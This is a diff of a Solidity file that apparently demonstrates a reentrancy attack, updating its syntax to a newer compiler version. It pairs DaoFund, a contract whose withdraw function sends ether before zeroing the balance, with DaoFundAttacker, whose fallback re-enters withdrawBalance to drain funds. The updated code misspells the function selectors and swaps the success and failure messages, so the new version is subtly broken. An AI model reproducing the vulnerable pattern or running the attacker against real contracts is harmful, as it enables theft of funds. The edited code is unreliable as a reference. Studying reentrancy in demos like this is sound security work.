@@ -1,68 +1,64 @@
-pragma solidity ^0.4.18;
+pragma solidity ^0.4.23;
 
-contract DaoFund{
+contract DaoFund {
 
-   mapping(address=>uint) balanceOf;
+    mapping (address => uint) balanceOf;
 
-   event WithdrawBalance(string message,uint gas);
+    event WithdrawBalance(string message, uint gas);
 
-   function getUserBalance(address user) external view returns(uint) {
-     return balanceOf[user];
-   }
+    function getUserBalance(address user) external view returns(uint) {
+        return balanceOf[user];
+    }
 
-   function addToBalance() external payable {
-     balanceOf[msg.sender] = balanceOf[msg.sender] + msg.value;
-   }
+    function addToBalance() external payable {
+        balanceOf[msg.sender] = balanceOf[msg.sender] + msg.value;
+    }
 
-   function withdrawBalance() external {
-     uint amountToWithdraw = balanceOf[msg.sender];
-    WithdrawBalance("withdrawBalance",msg.gas);
-     if (msg.sender.call.value(amountToWithdraw)() == false) {
-         revert();
-     }
-     balanceOf[msg.sender] = 0;
-   }
+    function withdrawBalance() external {
+        uint amountToWithdraw = balanceOf[msg.sender];
+        emit WithdrawBalance("withdrawBalance", gasleft());
+        if (msg.sender.call.value(amountToWithdraw)() == false) {
+            revert();
+        }
+        balanceOf[msg.sender] = 0;
+    }
 }
 
-contract DaoFundAttacker{
-   address fundAddress;
-   int goalAmount;
-   
-   event WithdrawBalance(string message,uint gas);
+contract DaoFundAttacker {
+    address fundAddress;
+    int goalAmount;
 
-   function  DaoFundAttacker(address _fundAddress) public {
-       fundAddress=_fundAddress;
-   }
+    event WithdrawBalance(string message, uint gas);
 
-   function() public payable {
+    constructor (address  _fundAddress) public {
+        fundAddress = _fundAddress;
+    }
 
-       goalAmount -= int(msg.value);
+    function () public payable {
+        goalAmount -= int(msg.value);
 
-       if( goalAmount > 0 )
-       {
-           if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
-               WithdrawBalance("Failed in fallback",msg.gas);
-           }
-           else WithdrawBalance("Succeeded in fallback",msg.gas);
-       }
-       else {
-           WithdrawBalance("Is_Attack is false in fallback",msg.gas);
-       }
-   }
-
-   function  deposit() public payable {
-        if(fundAddress.call.value(msg.value).gas(20764)(bytes4(keccak256("addToBalance()"))) ==false) {
-               revert();
+        if (goalAmount > 0) {
+            if (fundAddress.call(bytes4(keccak256("WithdrwaBalance()")))) {
+                emit WithdrawBalance("succeeded in fallback", gasleft());
+            } else emit WithdrawBalance("Failed in fallback", gasleft());
+        } else {
+                emit WithdrawBalance("All GoalAmount is withdrawed", gasleft());
         }
-   }
+    }
 
-   function  withdraw(uint _goalAmount) public {
-       goalAmount = int(_goalAmount * 1 ether);
-       
-        if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))==false ) {
-               WithdrawBalance("Failed in withdraw",msg.gas);
-               revert();
-        }
-        else WithdrawBalance("Succeeded in withdraw",msg.gas);
-   }
+    function deposit() public payable {
+        if (fundAddress.call.value(msg.value).gas(gasleft())
+            (bytes4(keccak256("addToBalance()"))) == false) {
+                revert();
+            }
+    }
+
+    function withdraw(uint _goalAmount) public {
+        goalAmount = int(_goalAmount * 1 ether);
+
+        if (fundAddress.call(bytes4(keccak256("WithdrawBalance()")))==false ) {
+            emit WithdrawBalance("Failed in withdraw", gasleft());
+            revert();
+        } else emit WithdrawBalance("Succeeded in withdraw", gasleft());
+    }
 }
